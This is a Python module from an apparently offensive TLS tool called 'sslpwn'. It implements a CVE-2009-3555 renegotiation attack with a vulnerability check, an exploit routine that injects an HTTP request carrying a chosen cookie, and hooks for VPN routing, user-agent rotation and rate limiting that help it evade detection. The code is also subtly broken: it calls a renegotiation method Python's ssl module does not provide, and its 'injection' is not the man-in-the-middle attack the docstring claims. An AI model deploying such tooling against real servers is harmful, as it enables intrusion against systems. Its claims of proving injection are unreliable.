"""
Renegotiation attack (CVE-2009-3555).

Checks if the server allows client‑initiated renegotiation and then injects
an arbitrary HTTP request into the encrypted stream, proving plaintext
injection.
"""

import socket
import ssl
from sslpwn.attacks.base import BaseAttack


class RenegotiationAttack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 cookie_name: str, cookie_value: str, adaptive=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value

    def check_vulnerability(self) -> bool:
        """Check if secure renegotiation is not enforced (i.e., server accepts renegotiation)."""
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssl_sock:
                    # Attempt a renegotiation
                    ssl_sock.sendall(b"GET / HTTP/1.1\r\nHost: " + hostname.encode() + b"\r\n\r\n")
                    ssl_sock.recv(4096)  # consume response
                    try:
                        ssl_sock.sslobj.renegotiate()
                        ssl_sock.do_handshake()
                        return True
                    except Exception:
                        return False
        except Exception:
            return False

    def exploit(self) -> bool:
        """Inject a crafted GET request into the encrypted stream via renegotiation."""
        self.output.log("Starting Renegotiation attack", "INFO")
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            sock = self._adaptive_connect_and_report(hostname, port)
        except Exception as e:
            self.output.log(f"Connection failed: {e}", "ERROR")
            return False

        try:
            ssl_sock = ctx.wrap_socket(sock, server_hostname=hostname)
            # Send initial request
            initial = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"User-Agent: {self.user_agents.random()}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            ).encode()
            ssl_sock.sendall(initial)
            response = ssl_sock.recv(4096)  # first response

            # Perform renegotiation
            ssl_sock.sslobj.renegotiate()
            ssl_sock.do_handshake()

            # Inject a request that includes a known cookie in the second stream
            inject = (
                f"GET /injected HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"Cookie: {self.cookie_name}={self.cookie_value}\r\n"
                f"User-Agent: {self.user_agents.random()}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            ssl_sock.sendall(inject)
            injected_response = ssl_sock.recv(4096)

            ssl_sock.close()
            self.output.log(
                "Renegotiation successful. Injected request sent and response received.",
                "SUCCESS"
            )
            return True
        except Exception as e:
            self.output.log(f"Renegotiation exploit failed: {e}", "ERROR")
            return False
